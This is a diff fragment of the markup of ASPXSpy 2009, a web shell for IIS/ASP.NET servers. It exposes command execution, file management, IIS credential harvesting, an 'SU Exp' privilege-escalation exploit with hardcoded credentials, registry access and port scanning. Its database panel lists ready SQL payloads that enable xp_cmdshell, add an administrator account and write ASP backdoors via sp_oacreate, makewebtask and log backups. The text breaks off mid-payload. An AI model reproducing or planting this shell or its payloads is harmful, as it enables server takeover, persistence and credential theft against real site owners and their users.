+<span class="ni">&amp;lt;</span>td <span class="ni">&amp;gt;&amp;lt;</span>span style=&quot;float:right;&quot;<span class="ni">&amp;gt;&amp;lt;</span>a href=&quot;http://www.rootkit.net.cn&quot; target=&quot;_blank&quot;<span class="ni">&amp;gt;</span>ASPXSpy Ver: 2009<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;&amp;lt;</span>/span<span class="ni">&amp;gt;&amp;lt;</span>span id=&quot;Bin_Span_Sname&quot; runat=&quot;server&quot; enableviewstate=&quot;true&quot;<span class="ni">&amp;gt;&amp;lt;</span>/span<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>tr class=&quot;alt1&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td<span class="ni">&amp;gt;&amp;lt;</span>span style=&quot;float:right;&quot; id=&quot;Bin_Span_FrameVersion&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;&amp;lt;</span>/span<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;UtkN&quot; runat=&quot;server&quot; OnClick=&quot;YKpI&quot; Text=&quot;Logout&quot; <span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;RsqhW&quot; runat=&quot;server&quot; Text=&quot;File Manager&quot; OnClick=&quot;Ybg&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;xxzE&quot; runat=&quot;server&quot; Text=&quot;CmdShell&quot; OnClick=&quot;VOxn&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;nuc&quot; runat=&quot;server&quot; Text=&quot;IIS Spy&quot; OnClick=&quot;KjPi&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;OREpx&quot; runat=&quot;server&quot; Text=&quot;Process&quot; OnClick=&quot;Grxk&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;jHN&quot; runat=&quot;server&quot; Text=&quot;Services&quot; OnClick=&quot;ilC&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;PHq&quot; runat=&quot;server&quot; Text=&quot;UserInfo&quot; OnClick=&quot;Olm&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;wmgnK&quot; runat=&quot;server&quot; Text=&quot;SysInfo&quot; OnClick=&quot;HtB&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;FeV&quot; runat=&quot;server&quot; Text=&quot;FileSearch&quot; OnClick=&quot;PPtK&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;PVQ&quot; runat=&quot;server&quot; Text=&quot;SU Exp&quot; OnClick=&quot;jXhS&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;jNDb&quot; runat=&quot;server&quot; Text=&quot;RegShell&quot; OnClick=&quot;xSy&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;HDQ&quot; runat=&quot;server&quot; Text=&quot;PortScan&quot; OnClick=&quot;cptS&quot; <span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;AoI&quot; runat=&quot;server&quot; Text=&quot;DataBase&quot; OnClick=&quot;dMx&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>asp:LinkButton ID=&quot;KHbEd&quot; runat=&quot;server&quot; Text=&quot;PortMap&quot; OnClick=&quot;fDO&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;15&quot; cellspacing=&quot;0&quot;<span class="ni">&amp;gt;&amp;lt;</span>tr<span class="ni">&amp;gt;&amp;lt;</span>td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;jDKt&quot; style=&quot;background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;&quot; runat=&quot;server&quot; visible=&quot;false&quot; enableviewstate=&quot;false&quot;<span class="ni">&amp;gt;&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>h2 id=&quot;Bin_H2_Title&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;&amp;lt;</span>/h2<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--FileList--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;CzfO&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; style=&quot;margin:10px 0;&quot;<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot; white-space:nowrap&quot;<span class="ni">&amp;gt;</span>Current Directory : <span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot; width:100%&quot;<span class="ni">&amp;gt;&amp;lt;</span>input class=&quot;input&quot; id=&quot;AXSbb&quot; type=&quot;text&quot; style=&quot;width:97%;margin:0 8px;&quot; runat=&quot;server&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;white-space:nowrap&quot; <span class="ni">&amp;gt;&amp;lt;</span>asp:Button ID=&quot;xaGwl&quot; runat=&quot;server&quot; Text=&quot;Go&quot; CssClass=&quot;bt&quot; OnClick=&quot;EXV&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>tr class=&quot;alt1&quot;<span class="ni">&amp;gt;&amp;lt;</span>td colspan=&quot;7&quot; style=&quot;padding:5px;&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div style=&quot;float:right;&quot;<span class="ni">&amp;gt;&amp;lt;</span>input id=&quot;Fhq&quot; class=&quot;input&quot; runat=&quot;server&quot; type=&quot;file&quot; style=&quot; height:22px&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Button ID=&quot;RvPp&quot; CssClass=&quot;bt&quot; runat=&quot;server&quot; Text=&quot;Upload&quot; OnClick=&quot;lbjLD&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/div<span class="ni">&amp;gt;&amp;lt;</span>asp:LinkButton ID=&quot;OLJFp&quot; runat=&quot;server&quot; Text=&quot;WebRoot&quot; OnClick=&quot;mcCY&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:LinkButton<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>a href=&quot;#&quot; id=&quot;Bin_Button_CreateDir&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>Create Directory<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span> | <span class="ni">&amp;lt;</span>a href=&quot;#&quot; id=&quot;Bin_Button_CreateFile&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>Create File<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>
+ | <span class="ni">&amp;lt;</span>span id=&quot;Bin_Span_Drv&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;&amp;lt;</span>/span<span class="ni">&amp;gt;&amp;lt;</span>a href=&quot;#&quot; id=&quot;Bin_Button_KillMe&quot; runat=&quot;server&quot; style=&quot;color:Red&quot;<span class="ni">&amp;gt;</span>Kill Me<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/td<span class="ni">&amp;gt;&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Table ID=&quot;UGzP&quot; runat=&quot;server&quot; Width=&quot;100%&quot; CellSpacing=&quot;0&quot; <span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:TableRow CssClass=&quot;head&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;&amp;nbsp;&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>Filename<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell Width=&quot;25%&quot;<span class="ni">&amp;gt;</span>Last modified<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell Width=&quot;15%&quot;<span class="ni">&amp;gt;</span>Size<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell Width=&quot;25%&quot;<span class="ni">&amp;gt;</span>Action<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>/asp:TableRow<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/asp:Table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--FileEdit--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;vrFA&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>Current File(import new file name and new file)<span class="ni">&amp;lt;</span>br/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>input class=&quot;input&quot; id=&quot;Sqon&quot; type=&quot;text&quot; size=&quot;100&quot; runat=&quot;server&quot;/<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>asp:DropDownList ID=&quot;NdCX&quot; runat=&quot;server&quot; CssClass=&quot;list&quot; AutoPostBack=&quot;true&quot; OnSelectedIndexChanged=&quot;zOVO&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem<span class="ni">&amp;gt;</span>Default<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem<span class="ni">&amp;gt;</span>UTF-8<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>/asp:DropDownList<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>File Content<span class="ni">&amp;lt;</span>br/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>textarea id=&quot;Xgvv&quot; runat=&quot;server&quot; class=&quot;area&quot; cols=&quot;100&quot; rows=&quot;25&quot; enableviewstate=&quot;true&quot; <span class="ni">&amp;gt;&amp;lt;</span>/textarea<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;&amp;lt;</span>asp:Button ID=&quot;JJjbW&quot; runat=&quot;server&quot; Text=&quot;Submit&quot; CssClass=&quot;bt&quot; OnClick=&quot;DGCoW&quot;/<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>asp:Button ID=&quot;iCNu&quot; runat=&quot;server&quot; Text=&quot;Back&quot; CssClass=&quot;bt&quot; OnClick=&quot;IkkO&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--CloneTime--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;zRyG&quot; runat=&quot;server&quot; enableviewstate=&quot;false&quot; visible=&quot;false&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>Alter file<span class="ni">&amp;lt;</span>br/<span class="ni">&amp;gt;&amp;lt;</span>input class=&quot;input&quot; id=&quot;QiFB&quot; type=&quot;text&quot; size=&quot;120&quot; runat=&quot;server&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>Reference file(fullpath)<span class="ni">&amp;lt;</span>br/<span class="ni">&amp;gt;&amp;lt;</span>input class=&quot;input&quot; id=&quot;lICp&quot; type=&quot;text&quot; size=&quot;120&quot; runat=&quot;server&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;&amp;lt;</span>asp:Button ID=&quot;JEaxV&quot; runat=&quot;server&quot; Text=&quot;Submit&quot; CssClass=&quot;bt&quot; OnClick=&quot;XXrLw&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>h2<span class="ni">&amp;gt;</span>Set last modified <span class="ni">&amp;raquo;&amp;lt;</span>/h2<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>Current file(fullpath)<span class="ni">&amp;lt;</span>br/<span class="ni">&amp;gt;&amp;lt;</span>input class=&quot;input&quot; id=&quot;pWVL&quot; type=&quot;text&quot; size=&quot;120&quot; runat=&quot;server&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:CheckBox ID=&quot;ZhWSK&quot; runat=&quot;server&quot; Text=&quot;ReadOnly&quot; EnableViewState=&quot;False&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;nbsp;</span>
+<span class="ni">&amp;lt;</span>asp:CheckBox ID=&quot;SsR&quot; runat=&quot;server&quot; Text=&quot;System&quot; EnableViewState=&quot;False&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;nbsp;</span>
+<span class="ni">&amp;lt;</span>asp:CheckBox ID=&quot;ccB&quot; runat=&quot;server&quot; Text=&quot;Hidden&quot; EnableViewState=&quot;False&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;nbsp;</span>
+<span class="ni">&amp;lt;</span>asp:CheckBox ID=&quot;fbyZ&quot; runat=&quot;server&quot; Text=&quot;Archive&quot; EnableViewState=&quot;False&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>
 CreationTime :
-&lt;input class="input" id="yUqx" type="text" runat="server"/&gt;
+<span class="ni">&amp;lt;</span>input class=&quot;input&quot; id=&quot;yUqx&quot; type=&quot;text&quot; runat=&quot;server&quot;/<span class="ni">&amp;gt;</span>
 LastWriteTime :
-&lt;input class="input" id="uYjw" type="text" runat="server"/&gt;
+<span class="ni">&amp;lt;</span>input class=&quot;input&quot; id=&quot;uYjw&quot; type=&quot;text&quot; runat=&quot;server&quot;/<span class="ni">&amp;gt;</span>
 LastAccessTime :
-&lt;input class="input" id="aLsn" type="text" runat="server"/&gt;
-&lt;/p&gt;
-&lt;p&gt;
-&lt;asp:Button ID="kOG" CssClass="bt" runat="server" Text="Submit" OnClick="tIykC"/&gt;
-&lt;/p&gt;
-&lt;/div&gt;
-&lt;%--IISSpy--%&gt;
-&lt;div runat="server" id="VNR" visible="false" enableviewstate="false"&gt;
-&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
-&lt;asp:Table ID="GlI" runat="server" Width="100%" CellSpacing="0"&gt;
-&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell&gt;ID&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;IIS_USER&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;IIS_PASS&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Domain&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Path&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
-&lt;/asp:Table&gt;
-&lt;/table&gt;
-&lt;/div&gt;
-&lt;%--Process--%&gt;
-&lt;div runat="server" id="DCbS" visible="false" enableviewstate="false"&gt;
-&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
-&lt;asp:Table ID="IjsL" runat="server" Width="100%" CellSpacing="0" &gt;
-&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell&gt;&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;ID&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Process&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;ThreadCount&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Priority&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Action&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
-&lt;/asp:Table&gt;
-&lt;/table&gt;
-&lt;/div&gt;
-&lt;%--CmdShell--%&gt;
-&lt;div runat="server" id="vIac"&gt;
- &lt;p&gt;CmdPath:&lt;br/&gt;
- &lt;input class="input" runat="server" id="kusi" type="text" size="100" value="c:\windows\system32\cmd.exe"/&gt;
- &lt;/p&gt;
- Argument:&lt;br/&gt;
- &lt;input class="input" runat="server" id="bkcm" value="/c Set" type="text" size="100"/&gt; &lt;asp:Button ID="YrqL" CssClass="bt" runat="server" Text="Submit" OnClick="FbhN"/&gt;
- &lt;div id="tnQRF" runat="server" visible="false" enableviewstate="false"&gt;
- &lt;/div&gt;
-&lt;/div&gt;
-&lt;%--Services--%&gt;
-&lt;div runat="server" id="iQxm" visible ="false" enableviewstate="false"&gt;
-&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
-&lt;asp:Table ID="vHCs" runat="server" Width="100%" CellSpacing="0" &gt;
-&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell&gt;&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;ID&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Name&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Path&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;State&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;StartMode&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
-&lt;/asp:Table&gt;
-&lt;/table&gt;
-&lt;/div&gt;
-&lt;%--Sysinfo--%&gt;
-&lt;div runat="server" id="ghaB" visible="false" enableviewstate="false"&gt;
-&lt;hr style=" border: 1px solid #ddd;height:0px;"/&gt;
-&lt;ul class="info" id="Bin_Ul_Sys" runat="server"&gt;&lt;/ul&gt;
-&lt;h2 id="Bin_H2_Mac" runat="server"&gt;&lt;/h2&gt;
-&lt;hr style=" border: 1px solid #ddd;height:0px;"/&gt;
-&lt;ul class="info" id ="Bin_Ul_NetConfig" runat="server"&gt;&lt;/ul&gt;
-&lt;h2 id="Bin_H2_Driver" runat="server"&gt;&lt;/h2&gt;
-&lt;hr style=" border: 1px solid #ddd;height:0px;"/&gt;
-&lt;ul class="info" id ="Bin_Ul_Driver" runat="server"&gt;&lt;/ul&gt;
-&lt;/div&gt;
-&lt;%--UserInfo--%&gt;
-&lt;div runat="server" id="xWVQ" visible="false" enableviewstate="false"&gt;
-&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
-&lt;asp:Table ID="VPa" runat="server" Width="100%" CellSpacing="0" &gt;
-&lt;/asp:Table&gt;
-&lt;/table&gt;
-&lt;/div&gt;
-&lt;%--SuExp--%&gt;
- &lt;div runat="server" id="APl"&gt;
-&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
- &lt;tr align="center"&gt;
- &lt;td style="width:10%"&gt;&lt;/td&gt;
- &lt;td style="width:20%" align="left"&gt;UserName : &lt;input class="input" runat="server" id="dNohJ" type="text" size="20" value="localadministrator"/&gt;&lt;/td&gt;
- &lt;td style="width:20%" align="left"&gt;PassWord : &lt;input class="input" runat="server" id="NMd" type="text" size="20" value="#l@$ak#.lk;0@P"/&gt;&lt;/td&gt;
- &lt;td style="width:20%" align="left"&gt;Port : &lt;input class="input" runat="server" id="HlQl" type="text" size="20" value="43958"/&gt;&lt;/td&gt;
- &lt;td style="width:10%"&gt;&lt;/td&gt;
- &lt;/tr&gt;
- &lt;tr &gt;
- &lt;td style="width:10%"&gt;&lt;/td&gt;
- &lt;td colspan="5"&gt;CmdShell&nbsp;&nbsp;:&nbsp;&lt;input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user"/&gt; &lt;asp:Button ID="SPhc" CssClass="bt" runat="server" Text="Exploit" OnClick="lRfRj"/&gt;&lt;/td&gt;
- &lt;/tr&gt;
-&lt;/table&gt;
-&lt;div id="UHlA" visible="false" enableviewstate="false" runat="server"&gt;
-&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
-&lt;tr align="center"&gt;
-&lt;td style="width:30%"&gt;&lt;/td&gt;
-&lt;td align="left" style="width:40%"&gt;&lt;pre id="Bin_Td_Res" runat="server"&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style="width:30%"&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;%--Reg--%&gt;
-&lt;div id="kkHN" runat="server"&gt;
-&lt;p&gt;Registry Path : &lt;asp:TextBox id="qPdI" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/&gt;&lt;asp:Button ID="MoNA" runat="server" Text="Go" CssClass="bt" onclick="RAFL"/&gt;&lt;/p&gt;
-&lt;table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;"&gt;
-&lt;asp:Table ID="pLWD" runat="server" Width="100%" CellSpacing="0" &gt;
-&lt;asp:TableRow CssClass="alt1"&gt;&lt;asp:TableCell ColumnSpan="2" id="vyX"&gt;&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
-&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell Width="40%"&gt;Key&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="60%"&gt;Value&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
-&lt;/asp:Table&gt;
-&lt;/table&gt;
-&lt;/div&gt;
-&lt;%--PortScan--%&gt;
-&lt;div id="YwLB" runat="server"&gt;
-&lt;p&gt;
-IP : &lt;asp:TextBox id="MdR" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/&gt; Port : &lt;asp:TextBox id="lOmX" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/&gt; &lt;asp:Button ID="CmUCh" runat="server" Text="Scan" CssClass="bt" OnClick="ELkQ"/&gt;
-&lt;/p&gt;
-&lt;div id="GBYT" runat="server" visible="false" enableviewstate="false"&gt;&lt;/div&gt;
-&lt;/div&gt;
-&lt;%--DataBase--%&gt;
-&lt;div id="iDgmL" runat="server"&gt;
-&lt;p&gt;ConnString : &lt;asp:TextBox id="MasR" style="width:70%;margin:0 8px;" CssClass="input" runat="server"/&gt;&lt;asp:DropDownList runat="server" CssClass="list" ID="WYmo" AutoPostBack="True" OnSelectedIndexChanged="zOVO" &gt;&lt;asp:ListItem&gt;&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB"&gt;MSSQL&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\database.mdb"&gt;ACCESS&lt;/asp:ListItem&gt;&lt;/asp:DropDownList&gt;&lt;asp:Button ID="QcZPA" runat="server" Text="Go" CssClass="bt" OnClick="BGY"/&gt;&lt;/p&gt;
-&lt;div id="dQIIF" runat="server"&gt;
-&lt;div id="irTU" runat="server"&gt;&lt;/div&gt;
-&lt;div id="uXevN" runat="server"&gt;
-Please select a database : &lt;asp:DropDownList runat="server" ID="Pvf" AutoPostBack="True" OnSelectedIndexChanged="zOVO" CssClass="list"&gt;&lt;/asp:DropDownList&gt;
-SQLExec : &lt;asp:DropDownList runat="server" ID="FGEy" AutoPostBack="True" OnSelectedIndexChanged="zOVO" CssClass="list"&gt;&lt;asp:ListItem Value=""&gt;-- SQL Server Exec --&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')"&gt;Add xp_cmdshell&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')"&gt;Add sp_oacreate&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"&gt;Add xp_cmdshell(SQL2005)&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;"&gt;Add sp_oacreate(SQL2005)&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;"&gt;Add makewebtask(SQL2005)&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;"&gt;Add openrowset/opendatasource(SQL2005)&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Exec master.dbo.xp_cmdshell 'net user'"&gt;XP_cmdshell exec&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="EXEC MASTER..XP_dirtree 'c:\',1,1"&gt;XP_dirtree&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^&gt;&gt;c:\bin.asp';"&gt;SP_oamethod exec&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="sp_makewebtask @outputfile='c:\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''"&gt;SP_makewebtask make file&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')"&gt;SandBox&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\1.asp' backup log @b to disk=@t with init,no_truncate;drop table [bin_cmd];"&gt;LogBackup&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup database @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\bin.asp' backup database @b to disk=@t WITH DIFFERENTIAL,FORMAT;drop table 